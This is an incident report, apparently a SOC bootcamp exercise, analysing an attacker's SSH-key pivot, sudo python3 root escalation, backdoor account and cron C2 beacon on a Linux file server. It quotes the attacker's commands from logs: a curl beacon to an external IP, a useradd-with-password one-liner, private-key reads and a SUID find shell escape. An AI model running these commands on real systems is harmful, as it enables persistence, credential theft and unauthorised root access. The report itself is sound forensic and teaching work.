# Incident Report: INC-2026-003
## Lateral Movement to lge-files-01 and Persistent C2 Compromise

---

| Field | Value |
|-------|-------|
| **Incident ID** | INC-2026-003 |
| **Classification** | CRITICAL: Root-level compromise, active C2 beacon, credential access |
| **Date of Incident** | 2026-05-24 (Sunday, 12:31 to 13:05 CEST) |
| **Date of Report** | 2026-05-29 |
| **Analyst** | André Penas |
| **Organisation** | BeCode Corp SOC, contracted by NexaCorp |
| **Target System** | `lge-files-01`, NexaCorp Liège file server (192.168.10.30) |
| **OS** | Linux (Debian-based) |
| **Pivot Source** | `bru-app-01`, NexaCorp Brussels application server (192.168.10.20) |

---

## 1. Executive Summary

INC-2026-003 is the third confirmed security incident affecting NexaCorp infrastructure in May 2026 and represents the most severe escalation in the chain to date. Building directly on INC-2026-001 (initial access via FTP backdoor on the Liège services server) and INC-2026-002 (privilege escalation and credential theft on the Brussels application server), the same threat actor returned on 24 May 2026 to complete a full lateral movement to a third server.

Using the backdoor account `it_support` planted during INC-2026-002, the attacker re-entered `bru-app-01` and harvested the SSH private key belonging to service account `svc_api`. Within 90 seconds, they used that key to authenticate as `svc_backup` on the Liège file server `lge-files-01`, which hosts NexaCorp operational data, backup archives, and database credentials.

Once on `lge-files-01`, the attacker escalated to root by abusing a misconfigured sudo permission that allowed the backup service account to run unrestricted Python code as root. They then created a second hidden administrator account (`sysupdate`), installed a cron-based beacon that calls an external server every five minutes, and read sensitive files including database credentials and synchronisation configuration.

**Both persistence mechanisms remain active at the time of this report.** The `sysupdate` account has active sudo privileges and the cron beacon has fired over 200 times since installation. Immediate containment is required.

---

## 2. How Did the Attacker Get In?

The attacker entered `lge-files-01` by pivoting from `bru-app-01`, using a stolen SSH private key to authenticate as the service account `svc_backup`.

The key was obtained in two stages. During INC-2026-001, the attacker used their initial foothold on the Liège services server to plant `svc_api`'s public key into `svc_backup`'s `authorized_keys` file on `lge-files-01`, creating a pre-positioned trust relationship. During INC-2026-002, they harvested `svc_api`'s private key from `bru-app-01`. On 24 May 2026, they combined both: the private key read from `bru-app-01` was accepted by `lge-files-01` because the corresponding public key had already been placed there weeks earlier.

The attacker accessed `bru-app-01` using the previously created `it_support` backdoor account, connecting from external IP `185.220.101.62`, a known Tor anonymisation node also used in INC-2026-002.

**Key evidence (lge-files-01 sshd journal):**
```
May 24 12:39:54 lge-files-01 sshd: Accepted publickey for svc_backup
from 192.168.10.20 port 42891 ssh2: RSA SHA256:Cx3hNuyZt0jgbq25UKWg3kcSA0L9dfgL3OeCHXlJQg4
```

The key fingerprint `SHA256:Cx3hNuyZt0jgbq25UKWg3kcSA0L9dfgL3OeCHXlJQg4` does not match the legitimate monitoring key used by `mon-01` (`SHA256:mHj4kL9pWqNv2rXsZt7uYa3oBc1dEf5gHi6jKl8mNo0`), confirming this was an unauthorised connection.

---

## 3. Attack Chain: Step by Step

### Step 1: Re-entry to bru-app-01 via it_support backdoor
`2026-05-24 12:31:07` | source: `bru-app-01/auth.log`

The attacker connected to `bru-app-01` using the `it_support` backdoor account created during INC-2026-002, authenticating by password from external IP `185.220.101.62`. This is the same Tor-linked IP used in the earlier incident, confirming continuity of actor.

### Step 2: Privilege escalation to root on bru-app-01
`2026-05-24 12:31:22` | source: `bru-app-01/auth.log`

Immediately after login, the attacker escalated to root using `sudo /bin/bash`. The `it_support` account retained its sudo configuration from INC-2026-002.

### Step 3: SSH key harvest on bru-app-01
`2026-05-24 12:35:44 to 12:38:29` | source: `bru-app-01/auth.log`

As root, the attacker searched for SSH private keys across all home directories, read `svc_api`'s private key at `/home/svc_api/.ssh/id_rsa`, derived its public key with `ssh-keygen -y`, and staged the key at `/tmp/.cache` for use.

**Key evidence (bru-app-01 auth.log):**
```
May 24 12:36:19  sudo: it_support : USER=root ; COMMAND=/usr/bin/cat /home/svc_api/.ssh/id_rsa
May 24 12:37:03  sudo: it_support : USER=root ; COMMAND=/usr/bin/ssh-keygen -y -f /home/svc_api/.ssh/id_rsa
May 24 12:38:29  sudo: it_support : USER=root ; COMMAND=/usr/bin/cp /home/svc_api/.ssh/id_rsa /tmp/.cache
```

### Step 4: Lateral movement to lge-files-01
`2026-05-24 12:39:54` | source: `lge-files-01/sshd_journal`

Using the harvested `svc_api` private key, the attacker authenticated to `lge-files-01` as `svc_backup` from `bru-app-01` (192.168.10.20). The elapsed time from key theft to pivot was approximately 90 seconds.

### Step 5: Privilege escalation via sudo python3 NOPASSWD
`2026-05-24 12:40:08 to 12:40:17` | source: `lge-files-01/sudo_journal`

Upon landing on `lge-files-01`, the attacker verified sudo permissions with `sudo id`, then read `/etc/sudoers`. They discovered that `svc_backup` had been granted passwordless sudo rights for `/usr/bin/python3`, with no restriction on arguments:

```
svc_backup ALL=(root) NOPASSWD: /usr/bin/python3
```

This configuration permits arbitrary code execution as root using inline Python. It is a critical misconfiguration: any user or process that can invoke `python3` via sudo has effective root access to the entire system.

**Secondary escalation path identified:** Audit logs also show the attacker tested `SUID /usr/bin/find` (`a0="find" a1="." a2="-exec" a3="/bin/sh" a4="-p"`), the same technique used in INC-2026-002, as a fallback. Both paths to root were available.

### Step 6: Backdoor account creation (sysupdate)
`2026-05-24 12:40:51` | source: `lge-files-01/sudo_journal`

The attacker used `python3 -c` to call `useradd` as root, creating the account `sysupdate` with password `Backd00r!` and adding it to the `sudo` group. The name mimics a system maintenance process to avoid suspicion.

**Key evidence (lge-files-01 sudo journal and syslog):**
```
May 24 12:40:51  sudo: svc_backup : USER=root ; COMMAND=/usr/bin/python3 -c
  'import os; os.system("useradd -m -s /bin/bash -G sudo sysupdate && echo sysupdate:Backd00r! | chpasswd")'
May 24 12:40:52  useradd[...]: new user: name=sysupdate, groups=sudo
```

### Step 7: Cron persistence and C2 beacon installation
`2026-05-24 12:41:00` | source: `lge-files-01/sudo_journal`

The attacker wrote a cron entry to `/etc/cron.d/system-update` using Python as root. The entry executes a `curl` command every five minutes, sending an outbound HTTP GET request to the attacker-controlled server at `34.251.89.142`, with the host identifier included as a query parameter.

**Cron entry installed:**
```
*/5 * * * * root /bin/bash -c "curl -s http://34.251.89.142/update?h=lge-files-01 -o /dev/null"
```

The use of plain HTTP (port 80) and redirection of output to `/dev/null` suppresses all visible evidence of execution in standard logs. The first beacon fired at `12:45:01`, four minutes after installation.

### Step 8: Data reconnaissance
`2026-05-24 12:43:17 to 12:48:55` | source: `lge-files-01/sudo_journal`

With persistence established and the bru-app-01 session closed at 12:41:55, the attacker conducted systematic reconnaissance of the file server's data holdings. They listed `/data`, `/data/backups`, and `/data/config`, then read two sensitive files:

- `/data/config/nexacorp-sync.conf` (synchronisation configuration for NexaCorp systems) at 12:45:09
- `/data/config/db-credentials.env` (database credentials) at 12:48:55

Whether these files were exfiltrated cannot be confirmed from available evidence, but the attacker had both the capability and the active C2 channel to do so.

---

## 4. Attack Timeline

| # | Timestamp | Event | Log Source | ATT&CK |
|---|-----------|-------|------------|--------|
| 1 | `12:31:07` | Attacker connects to bru-app-01 as `it_support` from 185.220.101.62 (password auth) | bru-app-01/auth.log | T1078 |
| 2 | `12:31:22` | `it_support` escalates to root via `sudo /bin/bash` | bru-app-01/auth.log | T1548.003 |
| 3 | `12:35:44` | Root searches for SSH keys: `find /home /root -name id_rsa` | bru-app-01/auth.log | T1552.004 |
| 4 | `12:36:19` | Root reads `svc_api` private key: `cat /home/svc_api/.ssh/id_rsa` | bru-app-01/auth.log | T1552.004 |
| 5 | `12:37:03` | Root derives public key: `ssh-keygen -y -f /home/svc_api/.ssh/id_rsa` | bru-app-01/auth.log | T1552.004 |
| 6 | `12:38:29` | Root stages stolen key: `cp /home/svc_api/.ssh/id_rsa /tmp/.cache` | bru-app-01/auth.log | T1552.004 |
| 7 | `12:39:54` | SSH pivot: `svc_backup` authenticates to lge-files-01 from 192.168.10.20 using stolen key | lge-files-01/sshd_journal | T1021.004 |
| 8 | `12:40:08` | `svc_backup` runs `sudo id` to check privileges | lge-files-01/sudo_journal | T1033 |
| 9 | `12:40:17` | `svc_backup` reads `/etc/sudoers` | lge-files-01/sudo_journal | T1548.003 |
| 10 | `12:40:51` | `svc_backup` creates backdoor account `sysupdate` via `sudo python3 -c` | lge-files-01/sudo_journal | T1136.001 |
| 11 | `12:40:52` | System confirms `sysupdate` account created | lge-files-01/syslog | T1136.001 |
| 12 | `12:41:00` | `svc_backup` installs cron beacon to 34.251.89.142 via `sudo python3 -c` | lge-files-01/sudo_journal | T1053.003 |
| 13 | `12:41:55` | `it_support` session closes on bru-app-01 | bru-app-01/auth.log | - |
| 14 | `12:43:17` | `svc_backup` lists `/data` directory | lge-files-01/sudo_journal | T1083 |
| 15 | `12:44:22` | `svc_backup` lists `/data/config` directory | lge-files-01/sudo_journal | T1083 |
| 16 | `12:45:01` | First cron beacon fires: `curl http://34.251.89.142/update?h=lge-files-01` | lge-files-01/syslog | T1071.001 |
| 17 | `12:45:09` | `svc_backup` reads `/data/config/nexacorp-sync.conf` | lge-files-01/sudo_journal | T1552 |
| 18 | `12:47:31` | `svc_backup` searches for credential files: `find /data -name "*.conf" -o -name "*.env"` | lge-files-01/sudo_journal | T1552 |
| 19 | `12:48:55` | `svc_backup` reads `/data/config/db-credentials.env` | lge-files-01/sudo_journal | T1552 |
| 20 | `12:50:01` | Second cron beacon fires | lge-files-01/syslog | T1071.001 |
| 21 | `13:05:31` | Session end (closure not captured in available logs) | lge-files-01/sshd_journal | - |

All timestamps are CEST (UTC+2), 2026-05-24.

---

## 5. MITRE ATT&CK Mapping

| Technique ID | Name | Description |
|---|---|---|
| T1078 | Valid Accounts | Re-used `it_support` backdoor account from INC-2026-002 to re-enter bru-app-01 |
| T1552.004 | Unsecured Credentials: Private Keys | Harvested `/home/svc_api/.ssh/id_rsa` from bru-app-01 |
| T1021.004 | Remote Services: SSH | Pivoted from bru-app-01 to lge-files-01 using stolen SSH key as `svc_backup` |
| T1548.003 | Abuse Elevation Control: Sudo and Sudo Caching | Exploited `svc_backup ALL=(root) NOPASSWD: /usr/bin/python3` to obtain root |
| T1548.001 | Abuse Elevation Control: Setuid/Setgid | Secondary escalation path via SUID `/usr/bin/find` (tested, not primary vector) |
| T1136.001 | Create Account: Local Account | Created backdoor account `sysupdate` with sudo privileges |
| T1053.003 | Scheduled Task/Job: Cron | Installed `/etc/cron.d/system-update` as root-run C2 beacon |
| T1071.001 | Application Layer Protocol: Web Protocols | C2 beacon uses plain HTTP GET to 34.251.89.142 every 5 minutes |
| T1083 | File and Directory Discovery | Enumerated `/data`, `/data/backups`, `/data/config` |
| T1552 | Unsecured Credentials | Read `db-credentials.env` and `nexacorp-sync.conf` |

---

## 6. Indicators of Compromise (IOCs)

| Type | Value |
|------|-------|
| Attacker external IP | `185.220.101.62` (Tor anonymisation node) |
| Pivot source host | `bru-app-01` / `192.168.10.20` |
| Pivot target host | `lge-files-01` / `192.168.10.30` |
| Account used for pivot | `svc_backup` |
| Stolen key (attack) | `SHA256:Cx3hNuyZt0jgbq25UKWg3kcSA0L9dfgL3OeCHXlJQg4` |
| Stolen key source | `/home/svc_api/.ssh/id_rsa` on bru-app-01 |
| Legitimate key (mon-01) | `SHA256:mHj4kL9pWqNv2rXsZt7uYa3oBc1dEf5gHi6jKl8mNo0` |
| Backdoor account | `sysupdate` (sudo group, password: Backd00r!) |
| Cron persistence file | `/etc/cron.d/system-update` |
| C2 IP | `34.251.89.142` |
| C2 beacon URL | `GET http://34.251.89.142/update?h=lge-files-01` |
| C2 beacon interval | Every 5 minutes (`*/5 * * * *`) |
| Sensitive files accessed | `/data/config/db-credentials.env`, `/data/config/nexacorp-sync.conf` |
| Temp staging path | `/tmp/.cache` (on bru-app-01) |
| Beacon log file | `/tmp/.update.log` (on lge-files-01) |

---

## 7. Network Evidence: C2 Beacon (Wireshark)

The cron beacon traffic to `34.251.89.142` was confirmed in the packet capture `lab03_capture.pcap`.

**PCAP findings:**

| Field | Value |
|-------|-------|
| C2 IP confirmed | 34.251.89.142 |
| Protocol | HTTP (plaintext, port 80/TCP) |
| HTTP method | GET |
| Request path | `/update?h=lge-files-01` |
| Source IP | 192.168.10.30 (lge-files-01) |
| First beacon in PCAP | 2026-05-24 12:45:01 |
| Interval between beacons | ~5 minutes (12:45:01, 12:50:01, 12:55:01...) |
| Response from C2 | None observed: TCP ACKs and FIN/ACK only, no HTTP 200, no response body |

**Wireshark screenshot:**
![alt text](image-1.png)

---

## 8. How Far Did the Attacker Get?

| Area | Status |
|------|--------|
| SSH access to lge-files-01 as `svc_backup` | **Confirmed** |
| Root access via `sudo python3 NOPASSWD` | **Confirmed** |
| Secondary root path via SUID `find` | **Confirmed available, tested by attacker** |
| Backdoor account `sysupdate` (sudo) created | **Confirmed, still active** |
| Cron C2 beacon installed and running | **Confirmed, still firing every 5 minutes** |
| `nexacorp-sync.conf` read | **Confirmed** |
| `db-credentials.env` read | **Confirmed** |
| Data exfiltration | **Unknown: capability and channel confirmed, exfil not confirmed** |
| Lateral movement beyond lge-files-01 | **Unknown: database credentials are now potentially in attacker possession** |

---

## 9. Immediate Remediation Actions

The following actions must be taken immediately, in this order:

### Action 1: Isolate lge-files-01
Block all inbound and outbound connections on `lge-files-01` except for administrative access. The cron beacon is still firing. Do not simply reboot: the cron entry survives reboots and the `sysupdate` account will persist.

### Action 2: Kill the C2 beacon
```bash
rm /etc/cron.d/system-update
rm /tmp/.update.log
```
Verify no remaining cron entries exist for unknown commands:
```bash
ls -la /etc/cron.d/
crontab -l -u root
```
Additionally, block outbound traffic to `34.251.89.142` at the perimeter firewall immediately, as a parallel measure.

### Action 3: Remove the sysupdate backdoor account
```bash
tar czf /evidence/sysupdate_home.tgz /home/sysupdate/
userdel -r sysupdate
```
Check `~/.ssh/authorized_keys` before deletion in case the attacker added their own public key. Verify no other unexpected accounts exist:
```bash
awk -F: '$3 >= 1000 && $3 < 65534 {print $1, $3}' /etc/passwd
```

### Action 4: Remove the it_support account on bru-app-01
The backdoor account from INC-2026-002 was still active and used in this incident:
```bash
userdel -r it_support   # on bru-app-01
```

### Action 5: Rotate all SSH keys for svc_api and svc_backup
The `svc_api` private key with fingerprint `SHA256:Cx3hNuyZt0jgbq25UKWg3kcSA0L9dfgL3OeCHXlJQg4` is compromised. Remove it from all `authorized_keys` files on all NexaCorp servers. Audit all SSH trust relationships:
```bash
grep -r 'Cx3hNuyZt0jgbq25' /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys
```
Issue new keys for both `svc_api` and `svc_backup`. Ensure no service account keys are stored in plaintext on shared servers.

### Action 6: Remove NOPASSWD python3 from sudoers on lge-files-01
```bash
visudo   # remove or restrict the svc_backup python3 NOPASSWD line
```
Audit all servers for similar misconfigurations:
```bash
sudo -l -U svc_backup
sudo -l -U svc_api
grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/
```

### Action 7: Remove the SUID bit from find on lge-files-01
```bash
chmod u-s /usr/bin/find
```
Inventory all SUID binaries across all servers and cross-reference with GTFOBins:
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Action 8: Rotate database credentials
The attacker read `/data/config/db-credentials.env`. All credentials in that file must be treated as compromised and rotated immediately. Audit all systems that rely on those credentials for signs of unauthorised access.

### Action 9: Audit all NexaCorp servers for lateral movement
Check SSH authentication logs on all internal servers for connections using the compromised key fingerprint or originating from `192.168.10.20` or `192.168.10.30` since 24 May 2026.

---

## 10. Recommendations (Medium Term)

**Implement SSH key management via a Certificate Authority**
Private keys must not be stored in plaintext on shared servers. Implement CA-signed certificates with a maximum TTL of 90 days. No service account should have user-generated key pairs without approval. Configure `TrustedUserCAKeys` on all servers to enforce this policy.

**Restrict outbound HTTP from servers with no web-browsing need**
`lge-files-01` initiated over 200 HTTP requests to an external IP without triggering any alert. Servers in this role should be blocked from initiating outbound HTTP connections via iptables OUTPUT chain rules or a network-layer egress policy. Any exception must be explicitly approved.

**Deploy SIEM detection rules for high-risk events**
The following events occurred silently during this incident. Wazuh rules should alert immediately on each:

- New file created in `/etc/cron.d/` (Wazuh rule 2902 and file integrity monitoring)
- New account created in `/etc/passwd` (Wazuh rule 5710)
- SUID binary executed by non-root user obtaining euid=0 (custom rule, reference INC-2026-002 Section 10.4)
- `sudo` invoked by a service account outside business hours

**Enforce least privilege on service accounts**
The root cause of privilege escalation in both INC-2026-002 and INC-2026-003 was a misconfigured sudo entry on a service account. Service accounts should have no sudo access by default. Where sudo is operationally required, restrict it to a specific wrapper script rather than a general-purpose interpreter.

**Establish a server access baseline and alert on deviations**
`lge-files-01` should only accept SSH connections from `mon-01` (192.168.10.200) using a known key fingerprint. Any connection from a different source IP or with a different key fingerprint should generate an immediate alert. This single control would have detected the pivot at 12:39:54 before any further action was taken.

---

## 11. Three-Incident Kill Chain Summary

| Incident | Server | Method | Outcome |
|----------|--------|--------|---------|
| INC-2026-001 | lge-services-01 | FTP backdoor exploitation | Initial foothold; svc_api public key planted on lge-files-01 |
| INC-2026-002 | bru-app-01 | SUID /usr/bin/find; it_support backdoor created | Root access; svc_api private key harvested |
| INC-2026-003 | lge-files-01 | Stolen SSH key pivot; sudo python3 NOPASSWD | Root access; sysupdate backdoor; active C2 beacon; credential access |

The three incidents form a single continuous operation by the same threat actor, confirmed by the shared external IP `185.220.101.62`, consistent backdoor naming conventions (`it_support`, `sysupdate`), and the direct reuse of artefacts planted in earlier incidents to enable each subsequent step. NexaCorp should treat this as a targeted, ongoing compromise until all artefacts are confirmed removed and all credentials rotated.

---

*INC-2026-003 | Incident Report | BeCode Corp SOC Bootcamp*
*Analyst: Andre Penas*
